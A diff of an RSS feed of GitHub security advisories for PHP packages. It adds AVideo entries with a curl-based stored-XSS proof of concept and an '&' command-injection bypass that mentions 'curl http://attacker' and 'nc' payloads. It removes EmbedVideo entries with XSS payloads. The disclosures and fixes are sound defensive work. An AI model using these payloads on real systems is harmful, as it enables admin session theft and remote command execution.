@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-06-23T17:24:26.756Z</updated>
+    <updated>2026-06-23T19:22:44.698Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,177 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo Meet lugin: anonymous-to-admin stored XSS via unescaped participant User-Agent in getMeetInfo.json.php Participants panel]]></title>
+        <id>https://github.com/advisories/GHSA-7cqp-7cfv-6c3q</id>
+        <link href="https://github.com/advisories/GHSA-7cqp-7cfv-6c3q"/>
+        <updated>2026-06-23T19:11:27.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The Meet plugin stores the raw HTTP <code>User-Agent</code> header of every meeting participant and later renders it without output encoding in the meeting-management ("Participants") panel that the meeting host and site administrators open. An anonymous, unauthenticated attacker can join any public meeting while sending a <code>User-Agent</code> header containing an HTML payload. The payload is persisted in <code>meet_join_log.user_agent</code> and, when the host or an administrator opens the participant list, is injected verbatim into their DOM, executing attacker-controlled JavaScript in a privileged, authenticated session. This is a cross-privilege stored XSS: an anonymous visitor obtains script execution in the administrator's browser.</p>
+<h3 id="affected-versions">Affected versions</h3>
+<p><code>WWBN/AVideo</code> at current <code>master</code> commit <code>e8d6119f3cb1b849149906efeb0a41fc024f59f8</code> (and prior releases shipping the same code path). Not patched at the time of this report.</p>
+<h3 id="privilege-required">Privilege required</h3>
+<ul>
+<li><strong>Writer (attacker):</strong> unauthenticated / anonymous. Joining a public meeting requires no account and no password.</li>
+<li><strong>Victim (trigger):</strong> the meeting host or any site administrator who opens the meeting's participant-management panel.</li>
+</ul>
+<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
+<p>The stored value is never sanitized on write, then echoed without encoding on read.</p>
+<p>Write path — <code>plugin/Meet/Objects/Meet_join_log.php:147</code>:</p>
+<pre><code class="language-php">    public function setUser_agent($user_agent)
+    {
+        $this-&gt;user_agent = $user_agent;
+    }
+</code></pre>
+<p>Write path — <code>plugin/Meet/Objects/Meet_join_log.php:177</code>:</p>
+<pre><code class="language-php">    public static function log($meet_schedule_id)
+    {
+        $log = new Meet_join_log(0);
+        $log-&gt;setIp(getRealIpAddr());
+        $log-&gt;setMeet_schedule_id($meet_schedule_id);
+        $log-&gt;setUser_agent((isMobile() ? "Mobile: " : "") . get_browser_name());
+        $log-&gt;setUsers_id(User::getId());
+        return $log-&gt;save();
+    }
+</code></pre>
+<p><code>get_browser_name()</code> (<code>objects/functionsBrowser.php:239</code> and <code>:242</code>) returns the original-case <code>User-Agent</code> verbatim for any agent not matched to a known browser name:</p>
+<pre><code class="language-php">        return '[Bot] Other '.$user_agent;
+    }
+    //_error_log("Unknow user agent ($t) IP=" . getRealIpAddr() . " URI=" . getRequestURI());
+    return 'Other (Unknown) '.$user_agent;
+</code></pre>
+<p>Only the lowercased match copy is used for classification; the returned string still contains the raw, original <code>$_SERVER['HTTP_USER_AGENT']</code>. Because the value bypasses AVideo's object-setter sanitization layer (unlike <code>Meet_schedule::setTopic()</code>, which calls <code>xss_esc()</code>), the raw bytes reach the database unchanged.</p>
+<p>Read path — <code>plugin/Meet/getMeetInfo.json.php:71</code>:</p>
+<pre><code class="language-php">                        echo '&lt;li class="list-group-item"&gt;#' . $count . " - " . User::getNameIdentificationById($value['users_id']) . ' &lt;span class="badge"&gt;' . $value['created'] . '&lt;/span&gt;&lt;br&gt;&lt;small class="text-muted"&gt;' . $value['user_agent'] . '&lt;/small&gt;&lt;/li&gt;';
+</code></pre>
+<p><code>$value['user_agent']</code> is concatenated into the HTML with no <code>htmlspecialchars()</code>. The reader endpoint is gated by <code>Meet_schedule::canManageSchedule()</code> (site admin OR the schedule owner), so the value is rendered in a privileged context.</p>
+<h3 id="how-input-reaches-the-sink">How input reaches the sink</h3>
+<p>The join that records the log is reachable anonymously through <code>plugin/Meet/iframe.php:11</code> and <code>:17</code>:</p>
+<pre><code class="language-php">if (!Meet::validatePassword($meet_schedule_id, @$_REQUEST['meet_password'])) {
+    header("Location: {$global['webSiteRootURL']}plugin/Meet/confirmMeetPassword.php?meet_schedule_id=$meet_schedule_id");
+    exit;
+}
+$objLive = AVideoPlugin::getObjectData("Live");
+Meet_join_log::log($meet_schedule_id);
+</code></pre>
+<p>For a public meeting (<code>public = 2</code>), <code>Meet::validatePassword()</code> returns <code>true</code> for an anonymous request (no password set), so <code>Meet_join_log::log()</code> runs and stores the attacker's <code>User-Agent</code>. On the read side, the host/admin opens the participant modal, whose JavaScript fetches <code>getMeetInfo.json.php</code> and injects the response with jQuery <code>.html()</code> in <code>plugin/Meet/meet_scheduled.php:266</code>:</p>
+<pre><code class="language-js">                                                                success: function (response) {
+                                                                    if (response.error) {
+                                                                        avideoAlert("&lt;?php echo __("Sorry!"); ?&gt;", response.msg, "error");
+                                                                    } else {
+                                                                        $('#Meet_schedule2&lt;?php echo $meet_scheduled, $manageMeetings; ?&gt;Modal .modal-body').html(response.html);
+                                                                    }
+</code></pre>
+<p><code>.html(response.html)</code> parses and inserts the attacker-controlled markup, so the injected <code>onerror</code> handler executes in the host/admin DOM.</p>
+<h3 id="proof-of-concept--end-to-end-reproduction-against-pinned-version">Proof of concept — end-to-end reproduction (against pinned version)</h3>
+<p>Deployed against the project's official Docker stack (php8.5/apache2.4 + mariadb), pinned commit <code>e8d6119f3cb1b849149906efeb0a41fc024f59f8</code>. <code>&lt;TARGET&gt;</code> is the deployed host.</p>
+<pre><code class="language-bash"># 1. As the admin, create a PUBLIC meeting (public=2, no password):
+curl -sk -H 'Host: &lt;TARGET&gt;' -H "Cookie: $ADMIN_SESSION" -H 'Referer: https://&lt;TARGET&gt;/' \
+  --data-urlencode 'RoomTopic=Demo' --data-urlencode 'public=2' --data-urlencode 'RoomPasswordNew=' \
+  'https://&lt;TARGET&gt;/plugin/Meet/saveMeet.json.php'
+# Response: {"error":false,"meet_schedule_id":1, ...}
+
+# 2. As an ANONYMOUS attacker (no cookie), join the meeting while sending an HTML
+#    payload in the User-Agent. The trailing token " http" forces get_browser_name()
+#    into the raw-reflecting "[Bot] Other" branch.
+curl -sk -H 'Host: &lt;TARGET&gt;' -H 'Referer: https://&lt;TARGET&gt;/' \
+  -A '&lt;img src=x onerror=alert(document.domain)&gt; http' \
+  'https://&lt;TARGET&gt;/plugin/Meet/iframe.php?meet_schedule_id=1&amp;meet_password='
+# HTTP 200. Stored row: meet_join_log.user_agent =
+#   [Bot] Other &lt;img src=x onerror=alert(document.domain)&gt; http
+
+# 3. As the host/admin, open the participant panel:
+curl -sk -H 'Host: &lt;TARGET&gt;' -H "Cookie: $ADMIN_SESSION" -H 'Referer: https://&lt;TARGET&gt;/plugin/Meet/' \
+  'https://&lt;TARGET&gt;/plugin/Meet/getMeetInfo.json.php?meet_schedule_id=1'
+</code></pre>
+<p>The JSON <code>html</code> field contains the payload <strong>unescaped</strong>:</p>
+<pre><code class="language-html">&lt;small class="text-muted"&gt;[Bot] Other &lt;img src=x onerror=alert(document.domain)&gt; http&lt;/small&gt;
+</code></pre>
+<p>When the admin opens the participant modal in a browser, jQuery <code>.html(response.html)</code> injects this markup and the <code>onerror</code> handler executes in the admin's authenticated session, printing <code>document.domain</code>.</p>
+<p><strong>Negative control:</strong> joining with a benign browser <code>User-Agent</code> (<code>Mozilla/5.0 (Windows NT 10.0) Chrome/120.0 Safari/537.36</code>) causes <code>get_browser_name()</code> to return <code>Chrome</code>, which renders as plain text <code>&lt;small class="text-muted"&gt;Chrome&lt;/small&gt;</code> with no markup injection.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Cross-privilege stored XSS: an unauthenticated, anonymous visitor achieves JavaScript execution in the meeting host's and site administrator's authenticated browser sessions.</li>
+<li>Full account-takeover surface: theft of the admin session, CSRF-token exfiltration, and arbitrary authenticated actions (user and permission changes, plugin configuration) performed as the administrator.</li>
+<li>The payload persists in the database and fires for every privileged user who reviews the participant list of the affected meeting.</li>
+</ul>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Encode the stored value at the sink in <code>plugin/Meet/getMeetInfo.json.php:71</code>:</p>
+<pre><code class="language-php">. '&lt;/span&gt;&lt;br&gt;&lt;small class="text-muted"&gt;' . htmlspecialchars($value['user_agent'], ENT_QUOTES, 'UTF-8') . '&lt;/small&gt;&lt;/li&gt;';
+</code></pre>
+<p>Defense in depth: sanitize the value on write in <code>Meet_join_log::setUser_agent()</code>, mirroring the setter-layer encoding used by <code>Meet_schedule::setTopic()</code> (<code>xss_esc()</code>), so any other current or future reader of <code>meet_join_log.user_agent</code> is also protected.</p>
+<h3 id="fix-pr">Fix PR</h3>
+<p>A fix is provided on the advisory's private temporary fork: <code>WWBN/AVideo-ghsa-7cqp-7cfv-6c3q#1</code> (encodes the participant <code>User-Agent</code> at the sink with <code>htmlspecialchars($value['user_agent'], ENT_QUOTES, 'UTF-8')</code>).</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-7cqp-7cfv-6c3q">https://github.com/WWBN/AVideo/security/advisories/GHSA-7cqp-7cfv-6c3q</a></li>
+<li><a href="https://github.com/advisories/GHSA-7cqp-7cfv-6c3q">https://github.com/advisories/GHSA-7cqp-7cfv-6c3q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7cqp-7cfv-6c3q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-23T19:11:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo has an incomplete fix of CVE-2026-33482: sanitizeFFmpegCommand still allows a single '&' (background operator), giving OS command execution at the same execAsync sh -c sink]]></title>
+        <id>https://github.com/advisories/GHSA-wc3f-xc32-435f</id>
+        <link href="https://github.com/advisories/GHSA-wc3f-xc32-435f"/>
+        <updated>2026-06-23T17:42:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The fix for CVE-2026-33482 (GHSA-pmj8-r2j7-xg6c) is incomplete. That advisory reported that <code>sanitizeFFmpegCommand()</code> (<code>plugin/API/standAlone/functions.php</code>) failed to strip <code>$(...)</code> command substitution, allowing OS command injection at the <code>execAsync()</code> <code>sh -c</code> sink. The fix (commit <code>25c8ab90</code>) added <code>$</code>, <code>(</code>, <code>)</code>, <code>{</code>, <code>}</code>, <code>\n</code>, <code>\r</code> to the denylist character class and a <code>str_replace('&amp;&amp;', '', ...)</code>. It still does <strong>not</strong> neutralize a single <code>&amp;</code> (the shell background operator), which remains a command separator at the unchanged sink. Same entry point, same sink, same impact as the original — only the surviving metacharacter differs.</p>
+<p>Verified at master HEAD.</p>
+<h3 id="the-surviving-gap">The surviving gap</h3>
+<p>HEAD <code>sanitizeFFmpegCommand</code> (<code>functions.php</code>):</p>
+<pre><code class="language-php">$command = str_replace('&amp;&amp;', '', $command);                    // only the doubled form
+$command = preg_replace('/\s*&amp;?&gt;.*(?:2&gt;&amp;1)?/', '', $command);  // strips '&amp;' only when followed by '&gt;'
+$command = preg_replace('/[;|`&lt;&gt;$()\n\r{}]/', '', $command);   // char class has no '&amp;'
+// then requires the result to start with 'ffmpeg'
+</code></pre>
+<p>A single <code>&amp;</code> is therefore preserved. <code>ffmpeg ... &amp; &lt;cmd&gt;</code> passes the sanitizer and the <code>strpos(trim($command),'ffmpeg')===0</code> prefix gate.</p>
+<h3 id="sink-unchanged">Sink (unchanged)</h3>
+<p><code>plugin/API/standAlone/ffmpeg.json.php:418</code> -&gt; <code>execAsync($ffmpegCommand, $keyword)</code>. In <code>objects/functionsExec.php::execAsync</code>:</p>
+<pre><code class="language-php">$command = addcslashes($command, '"');   // line 686 — escapes only the double-quote
+$commandWithKeyword = "nohup sh -c \"$command &amp; echo \\$! &gt; /tmp/$keyword.pid\" &gt; /dev/null 2&gt;&amp;1 &amp;";  // line 705
+exec($commandWithKeyword, ...);          // line 712 — PHP exec() runs via /bin/sh -c
+</code></pre>
+<p>The sanitized command is embedded inside an inner <code>sh -c "..."</code>. A bare <code>&amp;</code> in <code>$command</code> separates commands for that inner shell, so the injected command executes. <code>addcslashes</code> escaping only <code>"</code> does not stop <code>&amp;</code>.</p>
+<h3 id="reachability">Reachability</h3>
+<p><code>ffmpeg.json.php</code> builds the command from <code>_decryptString(getInput('codeToExecEncrypted'))</code>. This is the <strong>same</strong> threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (<code>AV:N/AC:H/PR:N</code>).</p>
+<h3 id="proof-pocpoc_ampersand_bypassphp-pocoutputtxt">Proof (poc/poc_ampersand_bypass.php, poc/OUTPUT.txt)</h3>
+<p>Byte-faithful PHP harness: <code>sanitizeFFmpegCommand</code> copied verbatim from HEAD + the <code>execAsync</code> <code>sh -c</code> wrapping copied from <code>functionsExec.php</code>:</p>
+<pre><code>attacker input : ffmpeg -i input.mp4 &amp; touch /tmp/avideo_amp_rce_proof &amp; echo done out.mp4
+after sanitize : ffmpeg -i input.mp4 &amp; touch /tmp/avideo_amp_rce_proof &amp; echo done out.mp4
+ampersand survived : YES   passes prefix : YES
+final sh -c string:
+  nohup sh -c "ffmpeg -i input.mp4 &amp; touch /tmp/avideo_amp_rce_proof &amp; echo $! &gt; /tmp/testkw.pid" &gt; /dev/null 2&gt;&amp;1 &amp;
+&gt;&gt; injected touch executed: YES (/tmp/avideo_amp_rce_proof)
+</code></pre>
+<p>The sanitizer leaves <code>&amp;</code> intact and the injected <code>touch</code> runs at the sink.</p>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary OS command execution on the standalone encoder server, identical to CVE-2026-33482. Multiple <code>&amp;</code>-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the <code>&gt;</code> strip, but command execution (e.g. <code>&amp; curl http://attacker/...</code>, <code>&amp; nc ...</code>, dropping/running a file) is not.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Stop applying a metacharacter denylist to a <code>sh -c</code> sink. Build the ffmpeg invocation as an argv array with <code>escapeshellarg()</code> per token (the project already uses <code>escapeshellarg()</code> at 137 sites) instead of interpolating <code>$command</code> into <code>sh -c "..."</code>. If the denylist is kept as defense-in-depth, add <code>&amp;</code> to the stripped set — but the denylist approach has now missed two metacharacters in a row (<code>$()</code> then <code>&amp;</code>).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-wc3f-xc32-435f">https://github.com/WWBN/AVideo/security/advisories/GHSA-wc3f-xc32-435f</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f">https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f</a></li>
+<li><a href="https://github.com/advisories/GHSA-wc3f-xc32-435f">https://github.com/advisories/GHSA-wc3f-xc32-435f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wc3f-xc32-435f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-23T17:42:17.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[paymenter/paymenter] Paymenter has broken object level authorization via service reference manipulation on ticket creation]]></title>
         <id>https://github.com/advisories/GHSA-x93q-x9pc-w5hw</id>
@@ -850,74 +1021,5 @@ This endpoint acts as a proxy, taking remote, unverified content and serving it 
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-06-19T21:15:19.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[starcitizenwiki/embedvideo] StarCitizenWiki Extension Embed Video: Stored XSS via unsanitized class passed to template]]></title>
-        <id>https://github.com/advisories/GHSA-7h5p-637f-jfr7</id>
-        <link href="https://github.com/advisories/GHSA-7h5p-637f-jfr7"/>
-        <updated>2026-06-19T21:15:04.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The user supplied class value is fed directly into the sprintf call that creates HTML. You can add a quote to escape the class and then inject arbitrary html/javascript to the final output.</p>
-<h3 id="details">Details</h3>
-<p>The template <a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/EmbedHtmlFormatter.php#L138">here</a> adds a figure with a class that is substituted in. This value is provided to sprintf <a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/EmbedHtmlFormatter.php#L156">here</a>, an unescaped version of the class supplied by the user.</p>
-<pre><code>$template = &lt;&lt;&lt;HTML
-    &lt;figure class="%s" data-service="%s" %s %s&gt;
-        &lt;div class="embedvideo-wrapper" %s&gt;%s%s%s&lt;/div&gt;%s
-    &lt;/figure&gt;
-HTML;
-</code></pre>
-<h3 id="poc">PoC</h3>
-<p>Note the double quote immediately following the single quote to escape the class attribute in the template:</p>
-<pre><code>&lt;youtube class='" onmouseover="alert(document.domain)' id="dQw4w9WgXcQ"&gt;dQw4w9WgXcQ&lt;/youtube&gt;
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Arbitrary HTML can be inserted into the DOM by any user on any page, allowing for JavaScript to be executed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/security/advisories/GHSA-7h5p-637f-jfr7">https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/security/advisories/GHSA-7h5p-637f-jfr7</a></li>
-<li><a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/commit/370156335b325bb81d14d89edf0a1f2643d50a84">https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/commit/370156335b325bb81d14d89edf0a1f2643d50a84</a></li>
-<li><a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/releases/tag/v4.1.0">https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/releases/tag/v4.1.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-7h5p-637f-jfr7">https://github.com/advisories/GHSA-7h5p-637f-jfr7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7h5p-637f-jfr7</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-19T21:15:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[starcitizenwiki/embedvideo] StarCitizenWiki Extension Embed Video: Stored XSS via unsanitized service name in exception text]]></title>
-        <id>https://github.com/advisories/GHSA-c29q-5xm7-5p62</id>
-        <link href="https://github.com/advisories/GHSA-c29q-5xm7-5p62"/>
-        <updated>2026-06-19T21:14:16.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When passing an unknown service name to embedvideo, an error message is rendered containing the invalid service name. The service name is not sanitized and can contain HTML.</p>
-<h3 id="details">Details</h3>
-<p>There is a hardcoded list of allowed services in a switch statement inside <code>EmbedServiceFactory#newFromName</code> <a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/EmbedServiceFactory.php#L105">here</a>. When the service name is not known, an exception is thrown with the service name injected into the message via sprintf <a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/EmbedServiceFactory.php#L286">here</a>. This message is not sanitized and is marked as isHtml <a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedVideo.php#L303-L311">here</a>. Similarly with <code>{{evl:</code> <a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedVideo.php#L177-L183">here</a>.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>// Must be on a page, not on ExpandTemplates
-{{#ev:&lt;img src=x onerror=alert(document.domain)&gt;|dQw4w9WgXcQ}}
-{{#evl:id=dummy|service=&lt;img src=x onerror=alert(document.domain)&gt;}}
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Stored XSS that allows arbitrary Javascript/HTML insertion on any page that a user can edit.  It requires no interaction and executes in the wiki origin for every visitor to the page.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/security/advisories/GHSA-c29q-5xm7-5p62">https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/security/advisories/GHSA-c29q-5xm7-5p62</a></li>
-<li><a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/commit/9215564bf28a0ceb40be550a55ab78efc0accc56">https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/commit/9215564bf28a0ceb40be550a55ab78efc0accc56</a></li>
-<li><a href="https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/releases/tag/v4.1.0">https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/releases/tag/v4.1.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-c29q-5xm7-5p62">https://github.com/advisories/GHSA-c29q-5xm7-5p62</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c29q-5xm7-5p62</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-19T21:14:15.000Z</published>
     </entry>
 </feed>
